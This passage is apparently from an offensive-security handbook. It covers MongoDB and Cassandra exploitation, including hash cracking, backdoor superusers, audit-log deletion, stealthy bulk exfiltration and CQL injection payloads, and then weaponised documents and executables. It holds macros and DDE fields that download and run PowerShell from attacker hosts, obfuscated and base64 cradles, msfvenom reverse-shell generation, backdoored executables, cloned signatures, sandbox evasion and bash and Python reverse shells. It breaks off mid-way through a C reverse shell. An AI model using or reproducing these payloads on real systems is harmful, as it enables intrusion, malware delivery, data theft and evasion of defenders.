[Unverified]: Hashcat support for MongoDB formats depends on version and may require specific modules.

```bash
# Identify hash format
# SCRAM-SHA-1: stored_key:salt:iterations
# SCRAM-SHA-256: similar format

# John the Ripper (check for MongoDB format support)
john --format=mongodb-scram --wordlist=rockyou.txt hashes.txt

# Hashcat (format varies by implementation)
# No standard Hashcat mode for MongoDB SCRAM exists as of common versions
# Manual PBKDF2 cracking may be required
```

**Creating Administrative Users (if sufficient privileges):**

```javascript
// Create new admin user
use admin
db.createUser({
    user: "backdoor",
    pwd: "Password123!",
    roles: [{role: "root", db: "admin"}]
})

// Grant roles to existing user
db.grantRolesToUser("existing_user", [{role: "root", db: "admin"}])

// Modify existing user password
db.changeUserPassword("username", "newpassword")
```

**Role Enumeration:**

```javascript
// List all roles
db.getRoles({showPrivileges: true})

// Check current user's roles
db.runCommand({usersInfo: {forAllDBs: true}})

// List users with specific role
db.system.users.find({"roles.role": "root"})
```

### Data Exfiltration

Once access is established, systematic data extraction requires understanding MongoDB's collection structure and export capabilities.

**Manual Collection Enumeration:**

```javascript
// Iterate through all databases
db.adminCommand('listDatabases').databases.forEach(function(d) {
    print('Database: ' + d.name);
    db.getSiblingDB(d.name).getCollectionNames().forEach(function(c) {
        print('  Collection: ' + c);
        print('  Document count: ' + db.getSiblingDB(d.name)[c].count());
    });
});

// Dump entire collection
db.collection_name.find().forEach(printjson)

// Limit and paginate large collections
db.collection_name.find().limit(100)
db.collection_name.find().skip(100).limit(100)

// Search for sensitive data patterns
db.collection.find({$or: [
    {field: {$regex: /password/i}},
    {field: {$regex: /ssn/i}},
    {field: {$regex: /credit/i}}
]})
```

**Automated Export Tools:**

```bash
# Export single collection
mongoexport --host <target> --db <database> --collection <collection> --out output.json

# Export as CSV
mongoexport --host <target> --db <database> --collection <collection> --type=csv --fields field1,field2 --out output.csv

# Export with query filter
mongoexport --host <target> --db <database> --collection <collection> --query '{"role":"admin"}' --out admins.json

# Export all collections in database
for collection in $(mongosh --host <target> --quiet --eval "db.getCollectionNames().join('\n')"); do
    mongoexport --host <target> --db <database> --collection $collection --out ${collection}.json
done
```

**Database-Wide Backup:**

```bash
# Full database dump
mongodump --host <target> --out /path/to/dump

# Dump specific database
mongodump --host <target> --db <database> --out /path/to/dump

# Dump with authentication
mongodump --host <target> --username <user> --password <pass> --authenticationDatabase admin --out /path/to/dump

# Compress during dump
mongodump --host <target> --gzip --out /path/to/dump
```

**Programmatic Extraction with Python:**

```python
from pymongo import MongoClient
import json

# Connect without authentication
client = MongoClient('mongodb://<target>:27017/')

# List all databases
for db_name in client.list_database_names():
    print(f"Database: {db_name}")
    db = client[db_name]
    
    # List all collections
    for collection_name in db.list_collection_names():
        print(f"  Collection: {collection_name}")
        collection = db[collection_name]
        
        # Export collection to file
        documents = list(collection.find())
        with open(f"{db_name}_{collection_name}.json", 'w') as f:
            json.dump(documents, f, default=str, indent=2)
```

**Selective Data Targeting:**

```javascript
// Find documents with specific patterns
db.collection.find({"email": {$exists: true}})
db.collection.find({"credit_card": {$regex: /^\d{16}$/}})

// Aggregate sensitive information
db.collection.aggregate([
    {$match: {role: "admin"}},
    {$project: {username: 1, email: 1, password: 1, _id: 0}}
])

// Export with field selection
db.collection.find({}, {password: 1, email: 1, _id: 0})
```

**Network Considerations:**

```bash
# Tunnel MongoDB through SSH for slow exfiltration
ssh -L 27017:localhost:27017 user@<target>
mongodump --host localhost --out /local/path/dump

# Rate-limited extraction to avoid detection
for i in {1..1000}; do
    mongosh --host <target> --eval "db.collection.find().skip($i).limit(1)" >> data.json
    sleep 2
done
```

---

**Important Related Subtopics:**

- **MongoDB Authentication Mechanisms**: Understanding SCRAM-SHA-1/256, x.509 certificates, LDAP authentication
- **MongoDB Privilege Escalation**: Exploiting role misconfiguration and built-in role hierarchies
- **MongoDB Replication Attacks**: Targeting replica sets and sharded clusters
- **NoSQL Injection in Other Databases**: CouchDB, Redis, Cassandra exploitation patterns

---

## Cassandra Exploitation

### Overview of Cassandra Attack Surface

Apache Cassandra is a distributed NoSQL database typically running on TCP port 9042 (CQL native protocol), 9160 (Thrift protocol - deprecated), and 7000/7001 (inter-node communication). Cassandra's security model historically prioritized performance over authentication, making default installations often vulnerable to unauthenticated access.

**Critical Context**: Cassandra stores data in keyspaces (analogous to databases) containing tables. Unlike traditional RDBMS, Cassandra lacks built-in authentication by default in older versions, and even when enabled, weak configurations are common. Cassandra runs on Linux/Windows, typically under dedicated service accounts.

### Unauthenticated Cassandra Access

#### Service Discovery and Reconnaissance

**Nmap enumeration**:

```bash
# Basic port detection
nmap -p 9042,9160,7000,7001 <target>

# Version detection
nmap -p 9042 -sV <target>

# Cassandra-specific NSE scripts
nmap -p 9042 --script cassandra-info <target>
nmap -p 9042 --script cassandra-brute <target>
```

**Metasploit auxiliary module**:

```bash
use auxiliary/scanner/cassandra/cassandra_login
set RHOSTS <target>
set RPORT 9042
set BLANK_PASSWORDS true
set USER_AS_PASS true
run
```

#### Testing for Unauthenticated Access

**Using cqlsh** (Cassandra Query Language Shell):

```bash
# Connect without credentials (default pre-3.x behavior)
cqlsh <target> 9042

# If connection succeeds without authentication, you have unauthenticated access
```

**Alternative - nodetool** (administrative tool):

```bash
# Test cluster status access
nodetool -h <target> status

# If successful, returns cluster topology without authentication
```

**Python connection test**:

```python
from cassandra.cluster import Cluster

# Attempt connection without auth
cluster = Cluster(['<target>'], port=9042)
try:
    session = cluster.connect()
    print("[+] Unauthenticated access successful")
    session.execute("SELECT cluster_name FROM system.local")
except Exception as e:
    print(f"[-] Authentication required or connection failed: {e}")
```

#### Understanding Authentication Configurations

**Default authenticator behavior**:

- **AllowAllAuthenticator** (pre-Cassandra 3.x default): No authentication required
- **PasswordAuthenticator** (Cassandra 3.x+ default): Requires username/password

**Check configuration remotely** (if access obtained):

```cql
-- Query system authentication settings
SELECT * FROM system_auth.roles;
```

**[Unverified]** Many production deployments use AllowAllAuthenticator for legacy compatibility or misunderstand security implications during initial setup.

### Default Credentials

When PasswordAuthenticator is enabled, Cassandra creates a default superuser account.

#### Common Default Credentials

**Primary default**:

```
Username: cassandra
Password: cassandra
```

**Additional common credentials to test**:

```
admin:admin
admin:password
cassandra:admin
cassandra:password
root:root
admin:cassandra
```

#### Testing Default Credentials

**cqlsh authentication**:

```bash
# Test default cassandra/cassandra
cqlsh <target> 9042 -u cassandra -p cassandra

# Alternative credentials
cqlsh <target> -u admin -p admin
```

**Metasploit brute force with defaults**:

```bash
use auxiliary/scanner/cassandra/cassandra_login
set RHOSTS <target>
set USERNAME cassandra
set PASSWORD cassandra
run
```

**Python authentication test**:

```python
from cassandra.cluster import Cluster
from cassandra.auth import PlainTextAuthProvider

auth_provider = PlainTextAuthProvider(username='cassandra', password='cassandra')
cluster = Cluster(['<target>'], port=9042, auth_provider=auth_provider)

try:
    session = cluster.connect()
    print("[+] Authentication successful with cassandra:cassandra")
except Exception as e:
    print(f"[-] Authentication failed: {e}")
```

#### Post-Authentication Enumeration

Once authenticated:

```cql
-- List all keyspaces (databases)
DESCRIBE KEYSPACES;

-- View current user
SELECT * FROM system_auth.roles WHERE role = 'cassandra';

-- List all users/roles
SELECT * FROM system_auth.roles;

-- Check role permissions
LIST ALL PERMISSIONS;

-- View cluster information
SELECT * FROM system.local;
SELECT * FROM system.peers;

-- List tables in keyspace
USE <keyspace_name>;
DESCRIBE TABLES;
```

### Query Manipulation

Unlike SQL injection in RDBMS, Cassandra uses CQL (Cassandra Query Language) which has different attack vectors due to its NoSQL nature and limited dynamic query construction.

#### CQL Injection Contexts

**[Inference]** CQL injection is less common than SQL injection because:

1. CQL lacks stored procedures and command execution functions
2. Prepared statements are standard in Cassandra drivers
3. Limited string concatenation in typical applications

However, vulnerabilities exist when applications construct CQL queries dynamically.

#### Basic CQL Injection Testing

**Vulnerable query pattern** (application-side):

```python
# VULNERABLE CODE EXAMPLE
user_input = request.GET['username']
query = f"SELECT * FROM users WHERE username = '{user_input}'"
session.execute(query)
```

**CQL injection payloads**:

```cql
-- Authentication bypass attempts
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' ALLOW FILTERING --

-- Comment injection
' -- 
' /*

-- Additional condition injection
' OR role='admin' ALLOW FILTERING --
```

**ALLOW FILTERING clause abuse**:

```cql
-- Bypass index restrictions
' ALLOW FILTERING --

-- Example vulnerable query:
SELECT * FROM users WHERE username = 'admin' ALLOW FILTERING --' AND password='...'
-- Results in: SELECT * FROM users WHERE username = 'admin' ALLOW FILTERING
```

#### CQL-Specific Injection Techniques

**Exploiting BATCH statements**:

```cql
'; BEGIN BATCH INSERT INTO users (username, password) VALUES ('attacker', 'password'); APPLY BATCH; --
```

**Keyspace enumeration via error messages**:

```cql
-- Trigger errors revealing structure
' FROM system.schema_keyspaces WHERE '1'='1

-- Extract table names
' FROM system_schema.tables WHERE '1'='1
```

**Time-based inference** (limited applicability):

```cql
-- CQL lacks sleep functions, use complex queries
' AND username IN (SELECT DISTINCT username FROM large_table) --
```

**[Unverified]** Successful CQL injection typically requires combining multiple payloads due to CQL's restrictive syntax compared to SQL.

#### Testing Tools and Automation

**Manual testing with cqlsh**:

```bash
cqlsh <target> -u cassandra -p cassandra
cqlsh> SELECT * FROM keyspace.table WHERE column = 'test' OR '1'='1' ALLOW FILTERING;
```

**SQLMap adaptation** (limited effectiveness):

```bash
# SQLMap has minimal CQL support; primarily detects basic injections
sqlmap -u "http://<target>/api?id=1" --dbms=Cassandra --technique=E
```

**Custom Python fuzzing**:

```python
from cassandra.cluster import Cluster
from cassandra.auth import PlainTextAuthProvider

payloads = ["' OR '1'='1", "' OR '1'='1' ALLOW FILTERING --", "'; --"]

auth_provider = PlainTextAuthProvider(username='cassandra', password='cassandra')
cluster = Cluster(['<target>'], auth_provider=auth_provider)
session = cluster.connect('keyspace_name')

for payload in payloads:
    try:
        query = f"SELECT * FROM users WHERE username = '{payload}'"
        result = session.execute(query)
        print(f"[+] Payload successful: {payload}")
        print(f"    Results: {result}")
    except Exception as e:
        print(f"[-] Payload failed: {payload} - Error: {e}")
```

### Information Disclosure

#### System Keyspace Enumeration

System keyspaces contain cluster metadata and configuration details:

```cql
-- Access system keyspaces (usually readable by default users)
USE system;

-- Cluster configuration
SELECT * FROM system.local;
-- Returns: cluster_name, data_center, rack, release_version, tokens

-- Peer node information
SELECT * FROM system.peers;
-- Returns: peer IP addresses, data_center, rack (useful for network mapping)

-- Schema information
USE system_schema;
DESCRIBE TABLES;

-- List all keyspaces and tables
SELECT * FROM system_schema.keyspaces;
SELECT * FROM system_schema.tables;

-- Column definitions
SELECT * FROM system_schema.columns WHERE keyspace_name = '<target_keyspace>';
```

#### User and Permission Disclosure

```cql
-- List all roles/users
SELECT * FROM system_auth.roles;
-- Returns: role, can_login, is_superuser, member_of

-- Role permissions
SELECT * FROM system_auth.role_permissions;

-- Role members (group memberships)
SELECT * FROM system_auth.role_members;
```

**Output example**:

```
 role      | can_login | is_superuser | member_of
-----------+-----------+--------------+----
 cassandra |      True |         True |      null
 readonly  |      True |        False |      null
```

#### Application Data Extraction

Once authenticated, enumerate and extract sensitive data:

```cql
-- List all keyspaces
DESCRIBE KEYSPACES;

-- Common sensitive keyspace names to check
USE users;
USE authentication;
USE accounts;
USE customer_data;
USE application;

-- Dump table data
SELECT * FROM users LIMIT 1000;
SELECT * FROM credentials LIMIT 1000;
SELECT * FROM sessions LIMIT 1000;

-- Time-series data extraction (common in Cassandra)
SELECT * FROM events WHERE timestamp > '2025-01-01' LIMIT 10000;
```

#### Credential Extraction

**Password hash locations**:

```cql
-- Default password storage
SELECT * FROM system_auth.roles;
-- May contain salted_hash field for PasswordAuthenticator users

-- Application-specific credential tables
SELECT * FROM users;
SELECT username, password_hash FROM authentication.credentials;
```

**[Inference]** Cassandra's system_auth.roles table stores bcrypt password hashes when using PasswordAuthenticator. These hashes can be extracted for offline cracking.

**Extracting hashes for cracking**:

```cql
-- Export password hashes
SELECT role, salted_hash FROM system_auth.roles WHERE can_login = true;
```

**Hashcat cracking**:

```bash
# Cassandra uses bcrypt ($2a$ format)
hashcat -m 3200 -a 0 cassandra_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Configuration File Disclosure

**[Inference]** If you achieve command execution or file read capabilities through other means, target these configuration files:

**Linux default locations**:

```
/etc/cassandra/cassandra.yaml          # Main configuration
/etc/cassandra/cassandra-env.sh        # Environment settings
/var/lib/cassandra/commitlog/          # Transaction logs (may contain data)
/var/log/cassandra/system.log          # Log files
```

**Windows default locations**:

```
C:\Program Files\Cassandra\conf\cassandra.yaml
C:\Program Files\Cassandra\logs\system.log
```

**Sensitive settings in cassandra.yaml**:

- `authenticator`: AllowAllAuthenticator vs PasswordAuthenticator
- `authorizer`: Authorization configuration
- `seeds`: Cluster seed nodes (network pivoting)
- `listen_address`: Bind addresses
- `rpc_address`: Client connection address

#### JMX Interface Exploitation (Information Disclosure)

Cassandra exposes Java Management Extensions (JMX) on port 7199 for monitoring.

**Check JMX access**:

```bash
# Test unauthenticated JMX access
nmap -p 7199 --script jmx-brute <target>

# Connect with jmxterm
java -jar jmxterm.jar -l <target>:7199
```

**Extract information via JMX**:

```bash
# List MBeans
beans

# Get cluster information
get -b org.apache.cassandra.db:type=StorageService ClusterName
get -b org.apache.cassandra.db:type=StorageService OperationMode

# Extract token ring information
get -b org.apache.cassandra.db:type=StorageService TokenToEndpointMap
```

**Metasploit JMX exploitation**:

```bash
# If JMX is unauthenticated and RMI registry is accessible
use exploit/multi/misc/java_jmx_server
set RHOST <target>
set RPORT 7199
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

**[Unverified]** Default Cassandra installations may leave JMX unauthenticated, particularly in containerized deployments or development environments.

#### Data Exfiltration Techniques

**Using cqlsh COPY command**:

```cql
-- Export table to CSV
COPY keyspace.table TO '/tmp/extracted_data.csv' WITH HEADER = TRUE;

-- Export with delimiter
COPY users.credentials (username, password_hash, email) TO '/tmp/creds.csv';
```

**Python bulk extraction**:

```python
from cassandra.cluster import Cluster
from cassandra.auth import PlainTextAuthProvider
import csv

auth_provider = PlainTextAuthProvider(username='cassandra', password='cassandra')
cluster = Cluster(['<target>'], auth_provider=auth_provider)
session = cluster.connect('keyspace_name')

# Extract all rows
rows = session.execute("SELECT * FROM sensitive_table")

# Save to CSV
with open('exfiltrated_data.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(rows.column_names)  # Header
    for row in rows:
        writer.writerow(row)

print("[+] Data exfiltrated successfully")
```

#### Detecting Cassandra Version for Exploit Research

```cql
-- Query version information
SELECT release_version FROM system.local;

-- Or via nodetool
nodetool version
```

**Known CVEs for research** (verify applicability to target version):

- **CVE-2015-0225**: Remote code execution via custom payload in batch statements (Cassandra 1.2.0 - 1.2.19, 2.0.0 - 2.0.13, 2.1.0 - 2.1.3)
- **CVE-2020-17516**: Remote code execution via unsafe deserialization in user-defined functions (Cassandra 2.2.0 - 3.11.8, 4.0)

**[Unverified]** Many Cassandra deployments run outdated versions due to concerns about cluster upgrade complexity and downtime.

### Cassandra-Specific Post-Exploitation

#### Creating Backdoor Users

```cql
-- Create new superuser
CREATE ROLE backdoor WITH PASSWORD = 'P@ssw0rd!' AND LOGIN = true AND SUPERUSER = true;

-- Verify creation
LIST ROLES;

-- Grant all permissions
GRANT ALL ON ALL KEYSPACES TO backdoor;
```

#### Data Manipulation

```cql
-- Modify existing data
UPDATE users SET password_hash = '<malicious_hash>' WHERE username = 'admin';

-- Insert backdoor records
INSERT INTO users (user_id, username, password_hash, role) VALUES (uuid(), 'backdoor_user', '<hash>', 'admin');

-- Delete audit logs
DELETE FROM audit_logs WHERE timestamp < '2025-10-26';
```

#### Persistence via Configuration

**[Inference]** If you gain file system access (through LFI, RCE, or other vectors), modify cassandra.yaml:

```yaml
# Ensure authentication remains weak
authenticator: AllowAllAuthenticator

# Or add backdoor user to native authentication
# (requires restart to take effect)
```

### Key Defensive Indicators

When exploiting Cassandra, be aware these actions may generate logs/alerts:

1. **Failed authentication attempts** - system.log: "Authentication failed" messages
2. **Unauthenticated access** - May not log by default with AllowAllAuthenticator
3. **CREATE/ALTER ROLE statements** - Logged in system.log if audit enabled
4. **system_auth.roles queries** - May trigger SIEM alerts in monitored environments
5. **Large data exports (COPY command)** - High network traffic, disk I/O spikes
6. **JMX access** - JMX connections logged if monitoring enabled

### Limitations and Considerations

**Cassandra does NOT support**:

- Traditional SQL injection with UNION, stacked queries, or out-of-band data exfiltration
- Stored procedures or command execution functions (unlike MSSQL xp_cmdshell)
- File read/write operations via CQL (no LOAD_FILE or INTO OUTFILE equivalents)

**Privilege escalation is limited** - Focus on lateral movement via:

- Extracted credentials for other services
- Network topology information from system.peers
- Application-specific data revealing infrastructure details

---

**Recommended Related Topics**:

- Cassandra Cluster Lateral Movement (multi-node exploitation)
- NoSQL Injection Techniques (MongoDB, CouchDB comparison)
- Cassandra to Operating System Pivot (JMX RCE, file system access)

---

# SOCIAL ENGINEERING & CLIENT-SIDE ATTACKS



---

## Payload Delivery

### Malicious document generation (macro, embedded objects)

Malicious documents remain a highly effective delivery mechanism in CTF and real-world scenarios. Modern office documents support various embedded technologies that can execute code upon opening.

**Microsoft Office Macro-based Payloads**

**Basic VBA Macro Structure**

```vba
' Auto-execute on document open
Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

' Auto-execute in Excel
Sub Workbook_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    ' Payload code here
    Shell "cmd.exe /c powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')", vbHide
End Sub
```

**PowerShell Download Cradle Macro**

```vba
Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    ' Basic PowerShell download and execute
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')""", 0, False
End Sub
```

**Obfuscated Macro Techniques**

```vba
Sub AutoOpen()
    Dim cmd As String
    Dim shell As Object
    
    ' String obfuscation via concatenation
    cmd = "pow" & "ersh" & "ell.exe"
    cmd = cmd & " -no" & "p -w hi" & "dden"
    cmd = cmd & " -c I" & "EX (New-Ob" & "ject Net.WebC" & "lient).Down" & "loadString('http://attacker.com/p.ps1')"
    
    Set shell = CreateObject("WS" & "cript.She" & "ll")
    shell.Run cmd, 0
End Sub
```

**Base64 Encoded Payload Macro**

```vba
Sub AutoOpen()
    Dim cmd As String
    Dim shell As Object
    
    ' Base64 encoded PowerShell command
    cmd = "powershell.exe -nop -w hidden -enc " & _
          "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA" & _
          "wAC4AMQAwAC4AMQAwAC4AMQAwAC8AcAAuAHAAcwAxACcAKQA="
    
    Set shell = CreateObject("Wscript.Shell")
    shell.Run cmd, 0
End Sub
```

**Generating Payloads with MSFVenom**

```bash
# Generate VBA macro payload (outputs VBA code)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Generate VBA with custom executable
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba-exe -o macro.vba

# Generate PowerShell payload for macro delivery
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f psh -o payload.ps1

# Generate Python-based payload (for LibreOffice)
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o payload.py
```

**Creating Malicious Documents with MSF**

```bash
# Metasploit module for Office exploit
msfconsole -q
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set FILENAME important_document.docm
exploit

# Generate macro-enabled document
use exploit/multi/fileformat/office_word_hta
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.10.10
set LPORT 443
set FILENAME document.docm
exploit
```

**Using Empire/Starkiller for Macro Generation**

```bash
# PowerShell Empire macro generation
# [Unverified] - Command syntax varies by Empire version
uselistener http
set Host http://10.10.10.10:8080
execute

usestager windows/macro
set Listener http
set OutFile macro.vba
execute
```

**Embedded Object Attacks (OLE)**

**Equation Editor Exploit (CVE-2017-11882)**

```bash
# Using Metasploit
use exploit/windows/fileformat/office_ms17_11882
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set FILENAME exploit.rtf
exploit

# Using exploit toolkit
python CVE-2017-11882.py --command "cmd.exe /c powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')" --output exploit.rtf
```

**DDE (Dynamic Data Exchange) Injection**

```bash
# Create malicious DDE field in Word document
# Insert field with: Ctrl+F9 in Word

# DDE field syntax:
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell.exe -NoP -W Hidden -Enc <base64_payload>" }

# Excel DDE injection (in cell)
=cmd|'/c powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/p.ps1\")'!A1

# Alternative format
@SUM(1+1)*cmd|'/c calc.exe'!A1
```

**RTF Exploits**

```bash
# CVE-2017-0199 (RTF/HTA exploit)
use exploit/windows/fileformat/office_word_hta
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set SRVHOST 10.10.10.10
set SRVPORT 8080
set FILENAME document.rtf
exploit

# Using Python exploit script
python cve-2017-0199.py -M gen -w invoice.rtf -u http://10.10.10.10/payload.hta

# Generate HTA payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o payload.hta
```

**PDF Malicious Documents**

```bash
# Generate malicious PDF with embedded JavaScript
use exploit/windows/fileformat/adobe_pdf_embedded_exe
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set FILENAME document.pdf
set INFILENAME template.pdf
exploit

# PDF with launch action
use exploit/windows/fileformat/adobe_pdf_launch_action
set PAYLOAD windows/shell_reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set FILENAME malicious.pdf
exploit

# Using PDFtk to embed payload
pdftk original.pdf attach_files payload.exe output malicious.pdf
```

**LibreOffice/OpenOffice Macro Payloads**

```python
# Python macro for LibreOffice (Tools > Macros > Edit Macros)
import uno
import os

def exploit():
    os.system("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1")

# Execute on document open
g_exportedScripts = (exploit,)
```

**Document Generation Tools**

```bash
# Lucky Strike - Advanced macro generator
git clone https://github.com/curi0usJack/luckystrike
cd luckystrike
# Use GUI to generate various payloads

# MacroPack - Macro obfuscation and generation
git clone https://github.com/sevagas/macro_pack
python macro_pack.py -f payload.exe -t MACRO -o output.vba

# Generate obfuscated VBA
python macro_pack.py --obfuscate --generate payload.vba

# EvilClippy - VBA stomping and anti-analysis
git clone https://github.com/outflanknl/EvilClippy
EvilClippy.exe -s fake_code.vba -g -r document.docm

# Invoke-Obfuscation for PowerShell within macros
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

**VBA Stomping Technique**

[Inference] VBA stomping removes the VBA source code while retaining the compiled p-code, making static analysis difficult.

```bash
# Using EvilClippy
EvilClippy.exe -s decoy.vba -g document.docm

# The macro will execute but display fake source when viewed
```

**Embedding Files in Documents**

```bash
# Embed EXE in Word document using OLE
# 1. Insert > Object > Package
# 2. Select executable file
# 3. Change icon to appear legitimate

# Automated with MSF
use exploit/windows/fileformat/office_ole_multiple_dll_hijack
set FILENAME document.docx
exploit

# Template injection technique
# Create document with external template reference
# Modify document.xml.rels to point to malicious template
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://10.10.10.10/template.dotm" TargetMode="External"/>
```

**Metadata and Anti-Analysis**

```vba
' Check for sandbox/analysis environment
Sub AutoOpen()
    If DetectSandbox() = False Then
        ExecutePayload
    End If
End Sub

Function DetectSandbox() As Boolean
    Dim username As String
    Dim computername As String
    
    ' Check for common sandbox usernames
    username = Environ("USERNAME")
    computername = Environ("COMPUTERNAME")
    
    If InStr(username, "sandbox") > 0 Or InStr(computername, "MALWARE") > 0 Then
        DetectSandbox = True
    Else
        DetectSandbox = False
    End If
End Function
```

**Listener Setup**

```bash
# Metasploit handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit"

# Netcat listener
nc -lvnp 4444

# PowerShell Empire listener
# Configure in Empire/Starkiller interface
```

---

### Executable wrapping

Executable wrapping involves embedding malicious code within legitimate executables or creating standalone executables that appear benign while delivering payloads.

**Basic Executable Generation**

```bash
# Generate basic Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o payload.exe

# Generate 64-bit executable
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o payload64.exe

# Linux executable
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o payload.elf

# macOS executable
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f macho -o payload.macho
```

**Encoding and Obfuscation**

```bash
# Shikata Ga Nai encoder (single iteration)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_x10.exe

# Using different encoders
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/fnstenv_mov -i 5 -f exe -o payload.exe

# List available encoders
msfvenom --list encoders

# Chain multiple encoders [Inference] - May increase payload size significantly
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -e x86/call4_dword_xor -i 3 -f exe -o multi_encoded.exe
```

**Template Injection**

```bash
# Inject payload into legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe

# -x: Specify template executable
# -k: Keep original functionality
# -f: Output format

# 64-bit template injection
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -x legitimate_app.exe -k -f exe -o backdoored_app.exe

# [Unverified] Template injection may cause instability in some executables
```

**Using Veil Framework**

```bash
# Install Veil-Evasion
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent

# Launch Veil
./Veil.py

# Within Veil interface:
use evasion
list # Show available payloads
use c/meterpreter/rev_tcp
set LHOST 10.10.10.10
set LPORT 4444
generate
# Follow prompts to create executable
```

**Shellter - Dynamic Shellcode Injector**

```bash
# Install Shellter (Windows tool, can run via Wine on Linux)
wget https://www.shellterproject.com/Downloads/Shellter/Latest/shellter.zip
unzip shellter.zip

# Run Shellter (interactive mode)
wine shellter.exe

# Auto mode
wine shellter.exe -a --stealth --pe target.exe --payload meterpreter_reverse_tcp --lhost 10.10.10.10 --lport 4444

# [Unverified] Shellter performs dynamic analysis and may take significant time
```

**TheFatRat - Automated Backdoor Generator**

```bash
# Install TheFatRat
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
./setup.sh

# Run TheFatRat
./fatrat

# Menu options:
# 1) Create FUD backdoor with Metasploit
# 2) Create backdoor with PwnWinds
# 3) Create backdoor with Chaos
# Select option and follow prompts
```

**PyInstaller for Python Payloads**

```bash
# Create Python reverse shell
cat > payload.py << 'EOF'
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
EOF

# Convert to executable
pyinstaller --onefile --noconsole payload.py

# Add custom icon
pyinstaller --onefile --noconsole --icon=legitimate.ico payload.py

# For Windows from Linux
pyinstaller --onefile --noconsole --target-arch x86_64 payload.py
```

**Resource Hacker - Icon and Resource Manipulation**

```bash
# Replace icon in executable (Windows tool)
ResourceHacker.exe -open payload.exe -save payload_icon.exe -action addoverwrite -res legitimate.ico -mask ICONGROUP,MAINICON,

# Extract resources from legitimate application
ResourceHacker.exe -open legitimate.exe -save extracted.res -action extract -mask ,,

# Add version information
ResourceHacker.exe -open payload.exe -save payload_versioned.exe -action addoverwrite -res version.rc -mask VERSIONINFO,1,
```

**SigThief - Signature Cloning**

```bash
# Clone digital signature from legitimate file
git clone https://github.com/secretsquirrel/SigThief
cd SigThief

python sigthief.py -i legitimate_signed.exe -t payload.exe -o signed_payload.exe

# [Unverified] Cloned signatures will fail validation but may bypass cursory checks
```

**Compiling Custom Payloads**

```bash
# C reverse shell (Windows)
cat > reverse_shell.c << 'EOF'
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char cmd[1024];
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
